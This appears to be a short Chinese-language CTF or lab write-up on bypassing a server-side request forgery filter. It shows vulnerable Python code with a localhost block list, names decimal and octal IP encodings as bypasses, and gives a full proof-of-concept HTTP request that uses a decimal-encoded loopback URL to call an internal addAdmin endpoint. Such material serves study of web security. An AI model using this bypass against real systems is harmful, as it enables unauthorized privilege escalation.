SSRF绕过利用
本地地址验证

#python

blocked_host = ["127.0.0.1", "localhost", "0.0.0.0"]
def downloadManual(url):
    safeUrl = isSafeUrl(url)
    if safeUrl:
        try:
            local_filename = url.split("/")[-1]
            r = requests.get(url)
            
            with open(f"/opt/manualFiles/{local_filename}", "wb") as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
            return True
        except:
            return False
    
    return False

  
@api.route('/addAdmin', methods=['GET'])
@isFromLocalhost
def addAdmin():
    username = request.args.get('username')
    
    if not username:
        return response('Invalid username'), 400
    
    result = makeUserAdmin(username)

    if result:
        return response('User updated!')
    return response('Invalid username'), 400



用十进制、八进制、ip简写 都可以绕过 

注意构造 http://ip:本地映射端口/

poc:
POST /api/product HTTP/1.1
Host: 94.237.122.72:50216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.122.72:50216/product
Content-Type: application/json
Content-Length: 104
Origin: http://94.237.122.72:50216
Connection: keep-alive
Cookie: session=.eJwdyt0KgjAYgOF72XmSWpN1Zi7tGzEh8SdPIpfg1GmmJRrde9Lp-7wfNLRV3qAdyidWZJ6QvmQQzqBzCT00561wAEP1SCKHEW2ZdGFEU6bcIQ0WUG6VxfUL5CiFIv2_NdGcJiBPDqvzoy398mDyEkyfhianBdGu8Q3HbmdYmBbWpkvH590tbTya8xBw6rWrvXoTWq8DckHfHwTVNPk.aRGldA.NDJliDZUIShhRa8WDruPgtda5_g
Priority: u=0

{"name":"1","price":"1","description":"1","manual":"http://2130706433:1337/api/addAdmin?username=admin"}
